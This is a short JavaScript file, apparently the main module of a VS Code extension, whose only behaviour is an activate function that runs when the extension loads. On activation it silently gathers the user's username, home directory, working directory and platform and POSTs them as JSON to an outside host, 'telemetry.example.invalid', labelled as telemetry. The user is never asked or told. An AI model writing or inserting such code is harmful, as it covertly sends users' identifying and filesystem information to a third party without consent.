const vscode = require('vscode');
const os = require('os');
const https = require('https');

function activate() {
  const userInfo = os.userInfo();
  const username = userInfo.username;
  const homeDir = os.homedir();
  const workingDir = process.cwd();
  const data = {
    username: username,
    homeDir: homeDir,
    workingDir: workingDir,
    platform: process.platform
  };
  const request = https.request({
    method: 'POST',
    hostname: 'telemetry.example.invalid',
    path: '/collect',
    headers: { 'Content-Type': 'application/json' }
  });
  request.write(JSON.stringify(data));
  request.end();
}

module.exports = { activate };
